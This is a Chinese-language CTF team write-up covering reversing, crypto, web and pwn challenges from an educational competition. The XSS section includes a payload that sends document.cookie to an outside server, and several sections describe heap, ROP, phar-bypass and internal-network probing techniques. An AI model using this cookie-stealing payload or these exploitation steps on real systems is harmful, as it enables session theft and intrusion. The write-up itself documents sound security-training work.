+</code></pre><p>然後因為全部都在A-Za-z0-9 所以直接列出所有符合的</p><p>裡面有個 pikapika 的應該是Flag: <code>FLAG{PikAPikApikaPikap1Ka}</code></p><h5 id="分工：蔡昀達"><a class="anchor hidden-xs" href="#分工：蔡昀達" title="分工：蔡昀達"><span class="octicon octicon-link"></span></a>分工：蔡昀達</h5><h3 id="YugiMuto"><a class="anchor hidden-xs" href="#YugiMuto" title="YugiMuto"><span class="octicon octicon-link"></span></a>YugiMuto</h3><p>給了一個 <a href="http://main.gb" target="_blank" rel="noopener">main.gb</a> 檔, 用file看一下是個 Game Boy ROM image</p><p>下載並使用 bgb debugger 把檔案開起來, 發現要輸入一串東西, 輸入錯會顯示 “NO NO NO”</p><p>我使用ida 把 processor 設成 Zilog 80 [z80] 但解不出來, 因此使用 radare2 來做分析, 使用字串搜尋功能, 但沒找到任何線索, 像是"GIVE ME SOMETHING" 或是 “NO NO NO” 都沒找到</p><p>開始跑 bgb 發現它不會同步 follow pc counter 可能因為動太快, 而且很多涵式都在處理影像輸出, 因此很難直接用 bgb debug, 只能用設 breakpoint 的方式看有沒有走到</p><p>我用 bgb 的單步執行先走出等待輸入的涵式, 然後發現是在fuc.0x1357 的地方, 接著用 radare2 看 function xreference, 找到fuc.0x1357相關的涵式</p><pre><code>fuc.0x1285 -&gt; fuc.0x0200 -&gt; fuc.0x1357
+       -----&gt; fuc.0x1574 -&gt; fuc.0x1619
+       -----&gt; fuc.0x0e61
+</code></pre><p>把這幾個function瀏覽一遍發現fuc.0x0e16似乎是在做字串比對, 過程中查找並且研讀一波 gameboy instruction <a href="http://marc.rawer.de/Gameboy/Docs/GBCPUman.pdf" target="_blank" rel="noopener">http://marc.rawer.de/Gameboy/Docs/GBCPUman.pdf</a></p><p>最後直接跳到 fcn.0x0e61 執行, 把 breakpoint 設在 0xf9c 判斷式的位置, 用 bgb 選單中 debug -&gt; evaluate expression 來看 register 的值 (直接打c) 找到Flag: <code>FLAG{OHMYGODY0UAREGAM3B0Y}</code></p><h5 id="分工：蔡昀達1"><a class="anchor hidden-xs" href="#分工：蔡昀達1" title="分工：蔡昀達1"><span class="octicon octicon-link"></span></a>分工：蔡昀達</h5><h2 id="Crypto"><a class="anchor hidden-xs" href="#Crypto" title="Crypto"><span class="octicon octicon-link"></span></a>Crypto</h2><h3 id="RSACTR"><a class="anchor hidden-xs" href="#RSACTR" title="RSACTR"><span class="octicon octicon-link"></span></a>RSACTR</h3><p><span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-858-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mtext mathvariant=&quot;bold&quot;>Descrpition</mtext></mrow></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-4756" style="width: 7.072em; display: inline-block;"><span style="display: inline-block; position: relative; width: 5.791em; height: 0px; font-size: 122%;"><span style="position: absolute; clip: rect(1.386em, 1005.79em, 2.615em, -999.997em); top: -2.252em; left: 0em;"><span class="mrow" id="MathJax-Span-4757"><span class="texatom" id="MathJax-Span-4758"><span class="mrow" id="MathJax-Span-4759"><span class="mtext" id="MathJax-Span-4760" style="font-family: MathJax_Main-bold;">Descrpition</span></span></span></span><span style="display: inline-block; width: 0px; height: 2.257em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.309em; border-left: 0px solid; width: 0px; height: 1.191em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mrow class="MJX-TeXAtom-ORD"><mtext mathvariant="bold">Descrpition</mtext></mrow></math></span></span><script type="math/tex" id="MathJax-Element-858">\textbf{Descrpition}</script></span>:</p><p>給你3種操作，你總共可以操作3次。
+第一個是拿RSA參數，第二個是加密一個你給的明文，第三個是拿Flag的密文。加密方式大概像是</p><pre><code class="python hljs">nonce = random
+cipher = <span class="hljs-string">""</span>
+e = <span class="hljs-number">3</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(plaintext), <span class="hljs-number">16</span>):
+    x = pow(nonce, d, n)
+    c = x + plaintext[i:i+<span class="hljs-number">16</span>]
+    cipher += hex(c)
+    nonce += <span class="hljs-number">2020</span>
+</code></pre><p><span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-859-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mtext mathvariant=&quot;bold&quot;>Solution</mtext></mrow></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-4761" style="width: 5.074em; display: inline-block;"><span style="display: inline-block; position: relative; width: 4.152em; height: 0px; font-size: 122%;"><span style="position: absolute; clip: rect(1.386em, 1004.15em, 2.41em, -999.997em); top: -2.252em; left: 0em;"><span class="mrow" id="MathJax-Span-4762"><span class="texatom" id="MathJax-Span-4763"><span class="mrow" id="MathJax-Span-4764"><span class="mtext" id="MathJax-Span-4765" style="font-family: MathJax_Main-bold;">Solution</span></span></span></span><span style="display: inline-block; width: 0px; height: 2.257em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left: 0px solid; width: 0px; height: 1.003em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mrow class="MJX-TeXAtom-ORD"><mtext mathvariant="bold">Solution</mtext></mrow></math></span></span><script type="math/tex" id="MathJax-Element-859">\textbf{Solution}</script></span>:</p><p>首先我們可以用加密明文的方式拿到nonce，在這之後發現拿到的 cipher 符合下面這種形式：</p><p><code>(cipher - x)^3 = nonce + c*2020</code></p><p>其中除了x之外都是已知資訊。鑒於x = Flag是128bit，我們可以用coppersmith去解他。</p><h5 id="分工：陳泓為0"><a class="anchor hidden-xs" href="#分工：陳泓為0" title="分工：陳泓為0"><span class="octicon octicon-link"></span></a>分工：陳泓為</h5><p><code>FLAG{dIdyousolVEITWIthCoppERsmith}</code></p><h3 id="train"><a class="anchor hidden-xs" href="#train" title="train"><span class="octicon octicon-link"></span></a>train</h3><p><span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-860-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mtext mathvariant=&quot;bold&quot;>Descrpition</mtext></mrow></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-4766" style="width: 7.072em; display: inline-block;"><span style="display: inline-block; position: relative; width: 5.791em; height: 0px; font-size: 122%;"><span style="position: absolute; clip: rect(1.386em, 1005.79em, 2.615em, -999.997em); top: -2.252em; left: 0em;"><span class="mrow" id="MathJax-Span-4767"><span class="texatom" id="MathJax-Span-4768"><span class="mrow" id="MathJax-Span-4769"><span class="mtext" id="MathJax-Span-4770" style="font-family: MathJax_Main-bold;">Descrpition</span></span></span></span><span style="display: inline-block; width: 0px; height: 2.257em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.309em; border-left: 0px solid; width: 0px; height: 1.191em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mrow class="MJX-TeXAtom-ORD"><mtext mathvariant="bold">Descrpition</mtext></mrow></math></span></span><script type="math/tex" id="MathJax-Element-860">\textbf{Descrpition}</script></span>:</p><p>給你的密文大概像是</p><pre><code class="python hljs">IV = IV
+cipher = <span class="hljs-string">""</span>
+e = <span class="hljs-number">3</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(plaintext), <span class="hljs-number">16</span>):
+    c = pow( IV = plaintext[i:i+<span class="hljs-number">16</span>], e, n)
+    IV = c
+    cipher += hex(c)
+</code></pre><p><span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-861-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mtext mathvariant=&quot;bold&quot;>Solution</mtext></mrow></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-4771" style="width: 5.074em; display: inline-block;"><span style="display: inline-block; position: relative; width: 4.152em; height: 0px; font-size: 122%;"><span style="position: absolute; clip: rect(1.386em, 1004.15em, 2.41em, -999.997em); top: -2.252em; left: 0em;"><span class="mrow" id="MathJax-Span-4772"><span class="texatom" id="MathJax-Span-4773"><span class="mrow" id="MathJax-Span-4774"><span class="mtext" id="MathJax-Span-4775" style="font-family: MathJax_Main-bold;">Solution</span></span></span></span><span style="display: inline-block; width: 0px; height: 2.257em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left: 0px solid; width: 0px; height: 1.003em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mrow class="MJX-TeXAtom-ORD"><mtext mathvariant="bold">Solution</mtext></mrow></math></span></span><script type="math/tex" id="MathJax-Element-861">\textbf{Solution}</script></span>:</p><p>拿到的 cipher 符合下面這種形式：</p><p><code>(IV + x)^3 = cipher</code></p><p>其中除了x之外都是已知資訊。鑒於x = Flag是128bit，我們可以用coppersmith去解他。</p><h5 id="分工：陳泓為0"><a class="anchor hidden-xs" href="#分工：陳泓為0" title="分工：陳泓為0"><span class="octicon octicon-link"></span></a>分工：陳泓為</h5><p><code>FLAG{cBCNEVERGetSoLD}</code></p><h3 id="winner-winner-chicken-dinner"><a class="anchor hidden-xs" href="#winner-winner-chicken-dinner" title="winner-winner-chicken-dinner"><span class="octicon octicon-link"></span></a>winner winner chicken dinner</h3><p><span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-862-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mtext mathvariant=&quot;bold&quot;>Descrpition</mtext></mrow></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-4776" style="width: 7.072em; display: inline-block;"><span style="display: inline-block; position: relative; width: 5.791em; height: 0px; font-size: 122%;"><span style="position: absolute; clip: rect(1.386em, 1005.79em, 2.615em, -999.997em); top: -2.252em; left: 0em;"><span class="mrow" id="MathJax-Span-4777"><span class="texatom" id="MathJax-Span-4778"><span class="mrow" id="MathJax-Span-4779"><span class="mtext" id="MathJax-Span-4780" style="font-family: MathJax_Main-bold;">Descrpition</span></span></span></span><span style="display: inline-block; width: 0px; height: 2.257em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.309em; border-left: 0px solid; width: 0px; height: 1.191em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mrow class="MJX-TeXAtom-ORD"><mtext mathvariant="bold">Descrpition</mtext></mrow></math></span></span><script type="math/tex" id="MathJax-Element-862">\textbf{Descrpition}</script></span>:</p><p>給你一個step function大致如下:</p><pre><code class="python hljs">state = int.from_bytes(os.urandom(<span class="hljs-number">8</span>), <span class="hljs-string">'little'</span>)
+poly = <span class="hljs-number">0xaa0d3a677e1be0bf</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">step</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">global</span> state
+    out = state &amp; <span class="hljs-number">1</span>
+    state &gt;&gt;= <span class="hljs-number">1</span>
+    <span class="hljs-keyword">if</span> out:
+        state ^= poly
+    <span class="hljs-keyword">return</span> out
+</code></pre><p>server每43個step會讓你猜一次out，並告訴你猜中或否。</p><p><span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-863-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mtext mathvariant=&quot;bold&quot;>Solution</mtext></mrow></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-4781" style="width: 5.074em; display: inline-block;"><span style="display: inline-block; position: relative; width: 4.152em; height: 0px; font-size: 122%;"><span style="position: absolute; clip: rect(1.386em, 1004.15em, 2.41em, -999.997em); top: -2.252em; left: 0em;"><span class="mrow" id="MathJax-Span-4782"><span class="texatom" id="MathJax-Span-4783"><span class="mrow" id="MathJax-Span-4784"><span class="mtext" id="MathJax-Span-4785" style="font-family: MathJax_Main-bold;">Solution</span></span></span></span><span style="display: inline-block; width: 0px; height: 2.257em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left: 0px solid; width: 0px; height: 1.003em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mrow class="MJX-TeXAtom-ORD"><mtext mathvariant="bold">Solution</mtext></mrow></math></span></span><script type="math/tex" id="MathJax-Element-863">\textbf{Solution}</script></span>:</p><p>xor key 這個動作可以想成和在key對應的位置上的bit ^ out，所以我們可以模擬這個動作。這樣做後，相當於每43步會告訴你某些initial state 的 bit xor 起來是多少。收集一定數量後去做矩陣的對角化，找出每一個位置的initial bit是多少就可以回推現在的out是多少了。</p><h5 id="分工：陳泓為"><a class="anchor hidden-xs" href="#分工：陳泓為" title="分工：陳泓為"><span class="octicon octicon-link"></span></a>分工：陳泓為</h5><p><code>FLAG{w3_W4nT_fA_d4_CaI!!!fA_d4_CaI!!!fA_d4_CaI!!!}</code></p><h2 id="Web"><a class="anchor hidden-xs" href="#Web" title="Web"><span class="octicon octicon-link"></span></a>Web</h2><h3 id="babyRMI"><a class="anchor hidden-xs" href="#babyRMI" title="babyRMI"><span class="octicon octicon-link"></span></a>babyRMI</h3><p>這題給了一段 java code，當中用到的 RMI(Remote Method Invocation)，當前有一個 <code>client.java</code>，執行後就會得到一串 Hello 類的訊息。</p><p>稍微看一下 <code>RMIInterface</code> 的 code，就會注意到他有另外一個 method <code>getSecret</code>，改成執行它之後就會得到訊息說 FLAG 在別的 object 當中。
+查一下相關的 document ( <a href="https://docs.oracle.com/javase/8/docs/api/java/rmi/registry/Registry.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/8/docs/api/java/rmi/registry/Registry.html</a> )，就會發現 <code>Registry</code> 有個 method <code>list()</code> 可以列出所有的名稱，藉此找到名稱 <code>FLAG</code> 後，改成存取這個 object 就可得到 flag 了。</p><h5 id="分工：林廷衛0"><a class="anchor hidden-xs" href="#分工：林廷衛0" title="分工：林廷衛0"><span class="octicon octicon-link"></span></a>分工：林廷衛</h5><p>Flag: <code>FLAG{java_registry_is_important_to_rmi_deserialization_vulnerability!}</code></p><h3 id="how2meow"><a class="anchor hidden-xs" href="#how2meow" title="how2meow"><span class="octicon octicon-link"></span></a>how2meow</h3><ol>
+<li><code>upload.php</code>可以上傳一個zip檔，副檔名必須是<code>.meow</code>，解壓縮後裡面必須有個叫做<code>meow</code>的檔案，檔案內容為<code>edu-ctf</code></li>
+<li><code>meow.php</code>會parse你的query顯示出來</li>
+<li>可以傳<code>meow.php</code>的連結給admin，要想辦法把admin的cookie偷出來，標準的XSS題</li>
+</ol><p>隨便試一下，發現meow.php前端完全沒有filter，直接傳個<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>看看，結果沒有被執行，看log是被CSP擋掉了</p><p>看了一下header裡面有這行</p><pre><code>content-security-policy: default-src 'self' 'unsafe-eval'; img-src *;
+</code></pre><p>img沒擋，一開始想要用<code>&lt;img src='REMOTE_SRC'&gt;</code>，可以成功XSS，但不能用unsafe-inline所以沒辦法傳cookie</p><p>研究了一下<code>upload.php</code>，看能不能把script包到zip裡面，就能在server上面include，結果發現直接寫一段script，把zip的binary用<code>/**/</code>註解起來，append在script後面還是會被當成合法的zip，同時也是合法的script</p><pre><code class="js hljs"><span class="hljs-built_in">window</span>.location.href=<span class="hljs-string">'https://www.csie.ntu.edu.tw/~b04902004/a.php?flag='</span>+<span class="hljs-built_in">document</span>.cookie
+</code></pre><p>後面註解一段合法的zip binary，傳上去拿到zip檔的path</p><p>payload:</p><p><code>?q=https://komodo.zoolab.org:8443/meow.php?q=&lt;script src="upload/b16e62510f0d2b97ea7d369b52a709ddf599f3793f6f0ff66eb9ad6f7e8f55d1"&gt;&lt;/script&gt;</code></p><p>傳給admin後回到自己的server拿flag</p><h5 id="分工：王佑安1"><a class="anchor hidden-xs" href="#分工：王佑安1" title="分工：王佑安1"><span class="octicon octicon-link"></span></a>分工：王佑安</h5><p><code>FLAG{u_r_m3ow_xss_m4ster}</code></p><h3 id="King-of-PHP"><a class="anchor hidden-xs" href="#King-of-PHP" title="King-of-PHP"><span class="octicon octicon-link"></span></a>King of PHP</h3><p><code>?c</code>可以把內容用file_put_contens寫進tmp檔</p><p><code>?f</code>給檔名會用file_get_contents輸出</p><p><code>?info</code>可以看phpinfo，發現幾個重點</p><ol>
+<li>allow_url_fopen=true</li>
+<li>沒設base_opendir</li>
+</ol><p>然後看到會擋filename的第一個字元不能是p，很自然的想到可能是要擋phar deserializatoin，可以用<code>compress.zlib://phar://</code>bypass，但沒有找到可以觸發RCE的gadget，直到賽後還是沒想到要serialize什麼東西進去</p><p>中間有嘗試了幾個其他方向</p><ol>
+<li><code>?f=/proc/net/fib_trie</code>，發現ip=<code>172.17.0.13</code>，戳戳看附近其他ip，發現<code>?f=http://172.17.0.1</code>會噴個<code>It Works!</code>回來，但掃了一下<code>172.17.0.1</code>的其他path，除了index.html找不到其他東西會return</li>
+<li><code>?f=http://172.17.0.13/server-status</code>可以看到server-status，監控了一陣子其他人的request，看能不能偷到別人的payload，結果發現這個洞後直到比賽結束都沒有人解出來</li>
+<li>看了server-status後發現有人在戳<code>?f=/readflag</code>，跟著一起戳戳看，發現有個<code>/readflag.c</code>，裡面可以看到flag的位置在<code>/why_the_flag_name_is_so_weird</code>，但似乎權限不足，php讀不出來</li>
+</ol><h5 id="分工：王佑安1"><a class="anchor hidden-xs" href="#分工：王佑安1" title="分工：王佑安1"><span class="octicon octicon-link"></span></a>分工：王佑安</h5><h3 id="echo"><a class="anchor hidden-xs" href="#echo" title="echo"><span class="octicon octicon-link"></span></a>echo</h3><p>網頁上亂打東西進去，毫無反應就是個echo，</p><p>開f12看下source，發現有行註解</p><p><code>&lt;!-- /echo.zip --&gt;</code></p><p>把這個path打上去，拿到一包source code</p><p>code看起來也就是個簡單的echo server，找不到什麼明顯的洞，大概是要prototype pollution</p><p>用source code local架起來測試一下，結果<code>__proto__</code>的key都會被過濾掉，發現server沒開json data，urlencode傳進去default的parser是qs，trace他的source code後發現他會用<code>hasOwnProperty</code>檢查prototype pollution</p><p>沒辦法傳prototype pollution，只好trace看看express跟ejs的source code，但也沒有發現可以RCE的地方，後來就放棄了。</p><h5 id="分工：王佑安2"><a class="anchor hidden-xs" href="#分工：王佑安2" title="分工：王佑安2"><span class="octicon octicon-link"></span></a>分工：王佑安</h5><h2 id="Pwn"><a class="anchor hidden-xs" href="#Pwn" title="Pwn"><span class="octicon octicon-link"></span></a>Pwn</h2><h3 id="Impossible"><a class="anchor hidden-xs" href="#Impossible" title="Impossible"><span class="octicon octicon-link"></span></a>Impossible</h3><p>這題因為溝通失誤（當時凌晨三、四點了，我們都以為其他人已經睡了），所以有兩個人分別解了這題，以下分別列兩人的 write-up：</p><h4 id="林廷衛的版本"><a class="anchor hidden-xs" href="#林廷衛的版本" title="林廷衛的版本"><span class="octicon octicon-link"></span></a>林廷衛的版本</h4><p>一開始腦袋可能還沒進入 CTF 狀態，一直沒發現 <code>abs</code> 後 overflow 的問題，花了一些時間研究 scanf 輸入很長字串的時候對於 malloc、free 會有哪些操作等等。弄了其他一些東西之後，再回來才發現把長度指定成 <code>INT_MIN</code>（<span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-864-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mo>&amp;#x2212;</mo><mn>2147483648</mn></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-4786" style="width: 7.072em; display: inline-block;"><span style="display: inline-block; position: relative; width: 5.791em; height: 0px; font-size: 122%;"><span style="position: absolute; clip: rect(1.437em, 1005.74em, 2.513em, -999.997em); top: -2.252em; left: 0em;"><span class="mrow" id="MathJax-Span-4787"><span class="mo" id="MathJax-Span-4788" style="font-family: MathJax_Main;">−</span><span class="mn" id="MathJax-Span-4789" style="font-family: MathJax_Main;">2147483648</span></span><span style="display: inline-block; width: 0px; height: 2.257em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.184em; border-left: 0px solid; width: 0px; height: 1.066em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mo>−</mo><mn>2147483648</mn></math></span></span><script type="math/tex" id="MathJax-Element-864">-2147483648</script></span>）會導致取 <code>abs</code> 時 overflow 而維持負整數，後續又會因為 <code>read</code> 吃的長度參數是 unsigned 而變成極大正數，所以有 buffer overflow。</p><p>接下來就是單純的湊 ROP chain。</p><ul>
+<li>設定參數執行 puts 的 plt 讓它印出 puts 的 got 來取得 libc base</li>
+<li>設定參數執行 read 把我的輸入寫到 puts 的 got（然後輸入 one gadget 的位置）</li>
+<li>執行 puts 的 plt</li>
+</ul><p>這樣就可以順利執行 one gadget 了！但是要確認 constraint 能不能滿足。</p><p>實際執行之後，發現有一個 one gadget 的條件只要讓 stack 位置往下一格（8 bytes）就能滿足，所以我就在 ROP chain 裡加入一個無用的 <code>ret</code> 來解決。</p><p>我的 exploit script 是 <code>nkhg_solve.py</code>，執行時會在當前路徑尋找 <code>libc-2.27.so</code> 來取得一些 symbol 資訊。</p><p>Flag: <code>FLAG{H0w_did_y0u_byp4ss_my_ch3cking?_I7s_imp0ss1b1e!}</code></p><h4 id="蔡昀達的版本"><a class="anchor hidden-xs" href="#蔡昀達的版本" title="蔡昀達的版本"><span class="octicon octicon-link"></span></a>蔡昀達的版本</h4><p>一開始觀察source code, 發現要 buffer overflow一定要繞過len檢查, 但是檢查很完整, 因此猜是型別轉換的時後會 overflow 然後繞過檢查, 查了一下用到涵式的變數型別發現 abs 會 overflow 因此還是負數, 但在 read 是 unsigned 會當正數, 因此把長度輸入 -2147483648 就可以繞過檢查</p><p>接著開始串rop, 基本上跟 lab 的 retlibc 一模一樣, 先 leak libc_start_main 的位置, 再回到main重做一次, 第二次串上 /bin/sh 呼叫 system 拿 shell</p><p>過程中在 rop chain 裡面沒有塞 return 讓他對齊一直 crash, 後來發現這點改成跟 retlibc lab 一模一樣就成功了, 還是不熟悉在 rop chain 裡面塞ret的時機</p><p>我的 exploit script 是 <code>impossible.py</code></p><p>Flag: <code>FLAG{H0w_did_y0u_byp4ss_my_ch3cking?_I7s_imp0ss1b1e!}</code></p><h3 id="nonono"><a class="anchor hidden-xs" href="#nonono" title="nonono"><span class="octicon octicon-link"></span></a>nonono</h3><p>這題是標準的 note 型選單題。</p><p>去看最常有問題的 <code>free</code> 部份，這裡寫得很好，<code>free</code> 完還會把 pointer 設成 <code>NULL</code>，基本上不會有漏洞。除了基本的 <code>new</code>、<code>show</code>、<code>remove</code> 外，還有個奇怪的功能是讓它開檔讀取一個假的 flag 給我們。</p><p>研究了一陣之後，覺得計算 pointer 陣列 index 的變數型態怪怪的，實際測試一下，發現他的確會錯誤的蓋到負數區域。在 gdb 裡看一下位置，發現負數區域馬上就到不可寫的部份了，能蓋到的東西只有 <code>stdin@@GLIBC_2.2.5</code>、<code>stdout@@GLIBC_2.2.5</code> 跟 <code>completed</code>（某個被 <code>_do_global_dtors_aux</code> 用到的變數，不知道能幹麻），前兩者或許可以偽造一個 FILE structure 取代他來做壞事。</p><p>查了一下相關的資料，偽造 FILE structure 的基本要求是要構造出合法的 <code>lock</code> pointer，不然程式要 access 這個 structure 時會直接 crash。但是這題的保護全開，當前我沒有任何已知的合法記憶體位置可以用。這時突然想到，我可以用 <code>show</code> 功能指定負數區域，或許可以 leak 出東西，於是就利用這個方法先 leak 出了 code base。（我後來卡住時還有花時間把所有可觸及的區域研究一遍，裡面似乎也只夠 leak 出 code base，其他像是 heap、stack、libc 都沒辦法）</p><p>在我有了 code base 要為造 FILE structure 上去時，發現在 <code>malloc</code> 之後、我輸入東西前，<code>stdout</code> 跟 <code>stdin</code> 都會被用到，所以我偽造的 FILE structure 還沒輸入進去就會先因為 <code>lock</code> 壞掉而 crash。後來突然想到印出假 flag 的可疑功能可能有用！就是先執行一次那個功能，那麼就會有個合法的 FILE structure 被 free 回 heap，這時只要取正確的大小，就會直接把那個 structure 取出來，那麼就不會因為 <code>lock</code> 問題壞掉了！</p><p>接著就是要為造 <code>stdin</code> 還是 <code>stdout</code> 以及偽造後要做什麼的問題了。結論是：如果覆蓋 <code>stdin</code>，在 <code>malloc</code> 下去之後我就再也沒辦法輸入東西了（應該是因為回收進去的 FILE structure 裡的 file descriptor 不可用，我自己測試似乎上面寫了 <code>-1</code>）；而 <code>stdout</code> 可用，而且有個奇怪的現象，就是 <code>puts</code> 似乎會直接從 <code>libc</code> 的 data 段取 FILE structure，所以完全不受影響，而 <code>printf</code> 才會取全域變數的 <code>stdout</code>。</p><p>接下來想要構造假的 vtable，但是發現我沒有其他已知的可控位置跟好的函數來執行，所以必須先 leak 更多資訊。於是就適當的調整 fake <code>stdout</code> 的 flag 跟 buffer pointer，讓他印出包含 heap 跟 libc 位置的資料。接下來要偽造 vtable，嘗試一陣子加上找 source code 讀之後，才發現這個版本的 libc 似乎對 vtable 檢查過多，難以利用。</p><p>所以覺得回歸打 heap，方向是利用 <code>stdout</code> 的 buffer pointer 把全域變數中紀錄的 heap pointer 打壞。但是 <code>stdout</code> 寫入的值就是 <code>printf</code> 印出的值，是無法控制的，而且拿來覆蓋 pointer 的 low byte 還會因為 chunk address 沒有 align 而 crash，所以只能拿來覆蓋 second low byte。但是 second low byte 已經受到 ASLR 影響了，所以我會先花力氣精細的計算 heap address 把它調整到固定的樣子（top chunk 在 <code>0x----5000</code>），然後把中間的 <code>0x50</code> 複寫成 <code>0x53</code>，這樣他就會在下一次 <code>malloc</code> 取得的 chunk 中間，所以可以在把它 <code>free</code> 掉重新取出來前任意偽造上面的值，取得 arbitrary write！</p><p>這個 libc 是佛心的舊版 tcache，所以就開心的把 freehook 改成 system，然後 free 一塊寫有 <code>/bin/sh</code> 的 chunk 即可 get shell！</p><p>Exploit script 附在 <code>solve.py</code>，執行時會在當前路徑尋找 <code>libc.so.6</code> 來取得一些 symbol 資訊。（然後 code 段的 address 有可能無法順利被 puts 印出，所以有一定的失敗率）</p><h5 id="分工：林廷衛0"><a class="anchor hidden-xs" href="#分工：林廷衛0" title="分工：林廷衛0"><span class="octicon octicon-link"></span></a>分工：林廷衛</h5><p>Flag: <code>FLAG{Now_You_Know_the_File_Stream}</code></p><h3 id="re-alloc"><a class="anchor hidden-xs" href="#re-alloc" title="re-alloc"><span class="octicon octicon-link"></span></a>re-alloc</h3><p>這題用了蠻新的 libc 2.29（ubuntu:19.04 上的），是個保護扣掉 FULL RELRO 跟 PIE 的 heap 選單題，難點還有 pointer 只給兩個、沒有輸出 heap 資料的功能。</p><p>不過，藉由出題者好心附上的程式碼，可以初步找到不少漏洞：</p><ul>
+<li><code>read_long</code> 這裡面讀完 buf 不會補 null byte，平常被拿去 <code>atoll</code> 計算，不太能用，不過如果 GOT hijack 掉 <code>atoll</code> 就可能很實用了（其實還有 <code>__read_chk</code> 最後的 size 怪怪的，但查了一下資料覺得沒有辦法利用）</li>
+<li><code>read_input</code> 只要結尾不是換行字元就不會補 null byte</li>
+<li><code>allocate</code> 有個 off-by-one null byte</li>
+<li><code>reallocate</code> 把 size 設成 0 可以送一次 free，並且不會清掉 pointer，可以達到 Use After Free。</li>
+</ul><p>因為沒有輸出 heap 資料的功能，所以除非去玩 FILE structure，不然能利用的似乎只有刻意漏掉的 Partial RELRO 跟 No PIE。仔細看了一下 GOT 上有的東西，就想到一個很美好的規劃：把 <code>atoll</code> hijack 成 <code>printf@plt</code>。這樣一來等於有一個無限次輸入 16 byte 的 format string attack 可以用，而且當我們需要讓他發揮原本 <code>atoll</code> 的功能時，可以用 <code>%[number]c</code> 來控制函數的回傳值（因為這個數量的 byte 會被送到網路上，所以其實不適合輸入太大的數字，不過這題看起來也不會有需要輸入數值超過 <code>0x78</code> 的情況）。</p><p>想到這個美好的規劃之後，就著手要用 <code>reallocate</code> 功能的漏洞製造 double free，結果都沒辦法成功。搭配 source code 仔細 trace 一下，才發現這個版本 libc 對 tcache 有加上比較複雜的檢查，其機制簡述如下：
+「chunk 被放入 tcache 時，會在資料的第二個位置（第一個位置就是紀錄下一個 chunk 的 addr）紀錄一個特定值（應該就是 tcache 本身的位置）；當有 chunk 要被放入前，會先看那個位置是否就是那個特定值，如果是的話，直接把 tcache（同 size 的 chain）裡每個 chunk 掃過去檢查有沒有跟現在要放的這塊一樣。」
